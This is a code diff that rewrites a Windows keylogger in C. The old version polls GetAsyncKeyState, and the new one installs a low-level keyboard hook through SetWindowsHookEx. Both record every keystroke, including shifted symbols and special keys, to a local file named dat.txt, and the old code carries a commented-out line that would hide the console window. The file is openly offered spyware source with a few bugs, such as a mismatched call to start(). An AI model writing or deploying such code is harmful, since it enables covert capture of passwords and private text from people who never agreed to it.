@@ -1,268 +1,468 @@
-#define _WIN32_WINNT 0x0500
-#include <Windows.h>
-#include <string>
-#include <stdlib.h>
+#include <windows.h>
+#include <winuser.h>
 #include <stdio.h>
-#include <iostream>
-#include <fstream>
+#include <stdbool.h>
 
+#define VK_VOLUME_MUTE 0xAD
+#define VK_VOLUME_DOWN 0xAE
+#define VK_VOLUME_UP 0xAF
 
-
-using namespace std;
-
-
-
-void LOG(string input) {
-	fstream LogFile;
-	LogFile.open("dat.txt", fstream::app);
-	if (LogFile.is_open()) {
-		LogFile << input;
-		LogFile.close();
-	}
-}
-
-
-bool SpecialKeys(int S_Key) {
-
-    // handle special keys
-    // https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
-	switch (S_Key) {
-
-	    case VK_RBUTTON:
-            LOG("?RCLICK");
-
-        case VK_CANCEL:
-            LOG("?CANCEL");
-            return true;
-
-        case VK_BACK:
-            // LOG("\b");
-            LOG("?BACKPACE");
-            return true;
-
-        case VK_TAB:
-            LOG("?TAB");
-            return true;
-
-        case VK_CLEAR:
-            LOG("?CLEAR");
-            return true;
-
-        case VK_RETURN:
-            LOG("\n");
-            // LOG("?ENTER");
-            return true;
-
-        case VK_SHIFT:
-            LOG("?SHIFT");
-            return true;
-
-        case VK_CONTROL:
-            LOG("?CTRL");
-            return true;
-
-        case VK_MENU:
-            LOG("?ALT");
-            return true;
-
-        case VK_PAUSE:
-            LOG("?PAUSE");
-            return true;
-
-        case VK_CAPITAL:
-            LOG("?CAPSLOCK");
-            return true;
-
-        // IME Stuff - from 0x16 to 0x1A
-
-        case VK_ESCAPE:
-            LOG("?ESC");
-            return true;
-
-        // IME Stuff - from 0x1C to 0x1F
-
-        case VK_SPACE:
-            LOG("?SPACE");
-            return true;
-
-        case VK_PRIOR:
-            LOG("?PAGEUP");
-            return true;
-
-        case VK_NEXT:
-            LOG("?PAGEDOWN");
-            return true;
-
-        case VK_END:
-            LOG("?END");
-            return true;
-
-        case VK_HOME:
-            LOG("?HOME");
-            return true;
-
-        case VK_LEFT:
-            LOG("?ARROWLEFT");
-            return true;
-
-        case VK_UP:
-            LOG("?ARROWUP");
-            return true;
-
-        case VK_RIGHT:
-            LOG("?ARROWRIGHT");
-            return true;
-
-        case VK_DOWN:
-            LOG("?ARROWDOWN");
-            return true;
-
-        case VK_SELECT:
-            LOG("?SELECT");
-            return true;
-
-        case VK_PRINT:
-            LOG("?PRINT");
-            return true;
-
-        case VK_EXECUTE:
-            LOG("?EXECUTE");
-            return true;
-
-        case VK_SNAPSHOT:
-            LOG("?PRINTSCREEN");
-            return true;
-
-        case VK_INSERT:
-            LOG("?INSERT");
-            return true;
-
-        case VK_DELETE:
-            LOG("?DELETE");
-            return true;
-
-        case VK_HELP:
-            LOG("?HELP");
-            return true;
-
-        case VK_LWIN:
-            LOG("?WINLEFT");
-            return true;
-
-        case VK_RWIN:
-            LOG("?WINRIGHT");
-            return true;
-
-        case VK_APPS:
-            LOG("?APPS");
-            return true;
-
-        case VK_SLEEP:
-            LOG("?SLEEP");
-            return true;
-
-        case VK_NUMPAD0:
-            LOG("?NUM0");
-            return true;
-
-        case VK_NUMPAD1:
-            LOG("?NUM1");
-            return true;
-
-        case VK_NUMPAD2:
-            LOG("?NUM2");
-            return true;
-
-        case VK_NUMPAD3:
-            LOG("?NUM3");
-            return true;
-
-        case VK_NUMPAD4:
-            LOG("?NUM4");
-            return true;
-
-        case VK_NUMPAD5:
-            LOG("?NUM6");
-            return true;
-
-        case VK_NUMPAD6:
-            LOG("?NUM6");
-            return true;
-
-        case VK_NUMPAD7:
-            LOG("?NUM7");
-            return true;
-
-        case VK_NUMPAD8:
-            LOG("?NUM8");
-            return true;
-
-        case VK_NUMPAD9:
-            LOG("?NUM9");
-            return true;
-
-        case VK_MULTIPLY:
-            LOG("*");
-            return true;
-
-        case VK_ADD:
-            LOG("+");
-            return true;
-
-        case VK_SEPARATOR:
-            LOG("?SEPERATOR");
-            return true;
-
-        case VK_SUBTRACT:
-            LOG("-");
-            return true;
-
-        case VK_DECIMAL:
-            LOG(".");
-            return true;
-
-        case VK_DIVIDE:
-            LOG("/");
-            return true;
-
-        case VK_F1:
-            LOG("?F1");
-            return true;
-
-
-        case '¾':
-            LOG(".");
-            return true;
-
-
-        default:
-            return false;
-	}
-}
-
-int main()
+int isCapsLock(void)
 {
-	// ShowWindow(GetConsoleWindow(), SW_HIDE);
-	char KEY = 'x';
+    return (GetKeyState(VK_CAPITAL) & 0x0001);
+}
 
-	while (true) {
-		Sleep(5);
-		for (int KEY = 8; KEY <= 190; KEY++)
-		{
-			if (GetAsyncKeyState(KEY) == -32767) {
-				if (SpecialKeys(KEY) == false) {
+void log(char s1[])
+{
+    FILE* file = fopen("dat.txt", "a+");
+    int i = 0;
+    fputs(s1, file);
+    i++;
+    if (i == 50)
+    {
+        fputc('\n', file);
+        i = 0;
+    }
+    fclose(file);
+}
 
-					fstream LogFile;
-					LogFile.open("dat.txt", fstream::app);
-					if (LogFile.is_open()) {
-						LogFile << char(KEY);
-						LogFile.close();
-					}
+LRESULT CALLBACK
+LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;
+    char val[5];
+    DWORD dwMsg = 1;
+    switch (wParam)
+    {
 
-				}
-			}
-		}
-	}
+    case WM_KEYDOWN:
+    {
+        DWORD vkCode = pKeyBoard->vkCode;
 
-	return 0;
+        if ((vkCode >= 39) && (vkCode <= 64)) // Keys 0-9
+        {
+
+            if (GetAsyncKeyState(VK_SHIFT))
+            {
+                switch (vkCode)
+                // 0x30-0x39 is 0-9 respectively
+                {
+                case 0x30:
+                    log(")");
+                    break;
+                case 0x31:
+                    log("!");
+                    break;
+                case 0x32:
+                    log("@");
+                    break;
+                case 0x33:
+                    log("#");
+                    break;
+                case 0x34:
+                    log("$");
+                    break;
+                case 0x35:
+                    log("%");
+                    break;
+                case 0x36:
+                    log("^");
+                    break;
+                case 0x37:
+                    log("&");
+                    break;
+                case 0x38:
+                    log("*");
+                    break;
+                case 0x39:
+                    log("(");
+                    break;
+                }
+            }
+            else
+            {
+                sprintf(val, "%c", vkCode);
+                log(val);
+            }
+        }
+        else if ((vkCode > 64) && (vkCode < 91))
+        {
+            if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock()))
+            {
+                vkCode += 32;
+            }
+            sprintf(val, "%c", vkCode);
+            log(val);
+        }
+        else
+        {
+            switch (vkCode)
+            {
+            case VK_CANCEL:
+                log("[Cancel]");
+                break;
+            case VK_SPACE:
+                log(" ");
+                break;
+            case VK_LCONTROL:
+                log("[LCtrl]");
+                break;
+            case VK_RCONTROL:
+                log("[RCtrl]");
+                break;
+            case VK_LMENU:
+                log("[LAlt]");
+                break;
+            case VK_RMENU:
+                log("[RAlt]");
+                break;
+            case VK_LWIN:
+                log("[LWindows]");
+                break;
+            case VK_RWIN:
+                log("[RWindows]");
+                break;
+            case VK_APPS:
+                log("[Applications]");
+                break;
+            case VK_SNAPSHOT:
+                log("[PrintScreen]");
+                break;
+            case VK_INSERT:
+                log("[Insert]");
+                break;
+            case VK_PAUSE:
+                log("[Pause]");
+                break;
+            case VK_VOLUME_MUTE:
+                log("[VolumeMute]");
+                break;
+            case VK_VOLUME_DOWN:
+                log("[VolumeDown]");
+                break;
+            case VK_VOLUME_UP:
+                log("[VolumeUp]");
+                break;
+            case VK_SELECT:
+                log("[Select]");
+                break;
+            case VK_HELP:
+                log("[Help]");
+                break;
+            case VK_EXECUTE:
+                log("[Execute]");
+                break;
+            case VK_DELETE:
+                log("[Delete]");
+                break;
+            case VK_CLEAR:
+                log("[Clear]");
+                break;
+            case VK_RETURN:
+                log("[Enter]");
+                break;
+            case VK_BACK:
+                log("[Backspace]");
+                break;
+            case VK_TAB:
+                log("[Tab]");
+                break;
+            case VK_ESCAPE:
+                log("[Escape]");
+                break;
+            case VK_LSHIFT:
+                log("[LShift]");
+                break;
+            case VK_RSHIFT:
+                log("[RShift]");
+                break;
+            case VK_CAPITAL:
+                log("[CapsLock]");
+                break;
+            case VK_NUMLOCK:
+                log("[NumLock]");
+                break;
+            case VK_SCROLL:
+                log("[ScrollLock]");
+                break;
+            case VK_HOME:
+                log("[Home]");
+                break;
+            case VK_END:
+                log("[End]");
+                break;
+            case VK_PLAY:
+                log("[Play]");
+                break;
+            case VK_ZOOM:
+                log("[Zoom]");
+                break;
+            case VK_DIVIDE:
+                log("[/]");
+                break;
+            case VK_MULTIPLY:
+                log("[*]");
+                break;
+            case VK_SUBTRACT:
+                log("[-]");
+                break;
+            case VK_ADD:
+                log("[+]");
+                break;
+            case VK_PRIOR:
+                log("[PageUp]");
+                break;
+            case VK_NEXT:
+                log("[PageDown]");
+                break;
+            case VK_LEFT:
+                log("[LArrow]");
+                break;
+            case VK_RIGHT:
+                log("[RArrow]");
+                break;
+            case VK_UP:
+                log("[UpArrow]");
+                break;
+            case VK_DOWN:
+                log("[DownArrow]");
+                break;
+            case VK_NUMPAD0:
+                log("[0]");
+                break;
+            case VK_NUMPAD1:
+                log("[1]");
+                break;
+            case VK_NUMPAD2:
+                log("[2]");
+                break;
+            case VK_NUMPAD3:
+                log("[3]");
+                break;
+            case VK_NUMPAD4:
+                log("[4]");
+                break;
+            case VK_NUMPAD5:
+                log("[5]");
+                break;
+            case VK_NUMPAD6:
+                log("[6]");
+                break;
+            case VK_NUMPAD7:
+                log("[7]");
+                break;
+            case VK_NUMPAD8:
+                log("[8]");
+                break;
+            case VK_NUMPAD9:
+                log("[9]");
+                break;
+            case VK_F1:
+                log("[F1]");
+                break;
+            case VK_F2:
+                log("[F2]");
+                break;
+            case VK_F3:
+                log("[F3]");
+                break;
+            case VK_F4:
+                log("[F4]");
+                break;
+            case VK_F5:
+                log("[F5]");
+                break;
+            case VK_F6:
+                log("[F6]");
+                break;
+            case VK_F7:
+                log("[F7]");
+                break;
+            case VK_F8:
+                log("[F8]");
+                break;
+            case VK_F9:
+                log("[F9]");
+                break;
+            case VK_F10:
+                log("[F10]");
+                break;
+            case VK_F11:
+                log("[F11]");
+                break;
+            case VK_F12:
+                log("[F12]");
+                break;
+            case VK_F13:
+                log("[F13]");
+                break;
+            case VK_F14:
+                log("[F14]");
+                break;
+            case VK_F15:
+                log("[F15]");
+                break;
+            case VK_F16:
+                log("[F16]");
+                break;
+            case VK_F17:
+                log("[F17]");
+                break;
+            case VK_F18:
+                log("[F18]");
+                break;
+            case VK_F19:
+                log("[F19]");
+                break;
+            case VK_F20:
+                log("[F20]");
+                break;
+            case VK_F21:
+                log("[F21]");
+                break;
+            case VK_F22:
+                log("[F22]");
+                break;
+            case VK_F23:
+                log("[F23]");
+                break;
+            case VK_F24:
+                log("[F24]");
+                break;
+            case VK_OEM_2:
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log("?");
+                else
+                    log("/");
+                break;
+            case VK_OEM_3:
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log("~");
+                else
+                    log("`");
+                break;
+            case VK_OEM_4:
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log("{");
+                else
+                    log("[");
+                break;
+            case VK_OEM_5:
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log("|");
+                else
+                    log("\\");
+                break;
+            case VK_OEM_6:
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log("}");
+                else
+                    log("]");
+                break;
+            case VK_OEM_7:
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log("\\");
+                else
+                    log("'");
+                break;
+                break;
+            case 0xBC:                //comma
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log("<");
+                else
+                    log(",");
+                break;
+            case 0xBE:              //Period
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log(">");
+                else
+                    log(".");
+                break;
+            case 0xBA:              //Semi Colon same as VK_OEM_1
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log(":");
+                else
+                    log(";");
+                break;
+            case 0xBD:              //Minus
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log("_");
+                else
+                    log("-");
+                break;
+            case 0xBB:              //Equal
+                if (GetAsyncKeyState(VK_SHIFT))
+                    log("+");
+                else
+                    log("=");
+                break;
+            default:
+                dwMsg += pKeyBoard->scanCode << 16;
+                dwMsg += pKeyBoard->flags << 24;
+
+                char key[16];
+                GetKeyNameText(dwMsg, key, 15);
+                log(key);
+            }
+        }
+        break;
+    }
+    default:
+
+        return CallNextHookEx(NULL, nCode, wParam, lParam);
+    }
+    return 0;
+}
+
+DWORD WINAPI
+KeyLogger(LPVOID lpParameter)
+{
+
+    HHOOK hKeyHook;
+    HINSTANCE hExe = GetModuleHandle(NULL);
+
+    if (!hExe)
+    {
+        return 1;
+    }
+    else
+    {
+
+        hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC) LowLevelKeyboardProc, hExe, 0);
+
+        RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);
+
+        MSG msg;
+        while (GetMessage(&msg, NULL, 0, 0) != 0)
+        {
+            if (msg.message == WM_HOTKEY)
+            {
+                UnhookWindowsHookEx(hKeyHook);
+                return 0;
+            }
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+
+        UnhookWindowsHookEx(hKeyHook);
+    }
+    return 0;
+}
+
+int start(char* argv[])
+{
+    HANDLE hThread;
+
+    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) KeyLogger,
+            (LPVOID) argv[0], 0, NULL );
+
+    if (hThread)
+    {
+        return WaitForSingleObject(hThread, INFINITE);
+    }
+    return 1;
+}
+
+int main() {
+start();
 }
